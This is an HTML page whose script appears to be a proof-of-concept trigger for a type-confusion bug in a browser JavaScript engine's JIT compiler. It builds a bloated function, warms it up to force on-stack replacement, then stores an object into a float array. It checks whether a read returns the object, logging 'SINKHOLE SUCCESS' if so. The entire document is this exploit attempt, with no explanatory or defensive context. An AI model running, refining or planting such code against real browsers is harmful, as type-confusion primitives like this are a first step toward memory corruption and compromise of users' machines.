<!DOCTYPE html><html><body><script>
let lines = [];
lines.push("function osr_test(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push("  arr[0] = obj;");
lines.push("  let r = 0;");
lines.push("  for (let j = 0; j < 50000; j++) { r = arr[1]; }");
lines.push("  return r;");
lines.push("}");
lines.push("return osr_test;");

let fn = new Function(lines.join("\n"))();
let dummy = { a: 1 };
let dummy_arr = [1.1, 2.2, 3.3];

for (let i = 0; i < 5; i++) fn(1000, dummy_arr, dummy);
console.log("Warmup done for osr_test");

setTimeout(() => {
  console.log("Calling osr_test post-OSR...");
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1000, farr, dummy);
  console.log("res type:", typeof res, "res:", res);
  if (typeof res === "object") {
    console.log("=== SINKHOLE SUCCESS! Object:", res, "===");
  } else {
    console.log("res is still:", res);
  }
}, 3000);
</script></body></html>
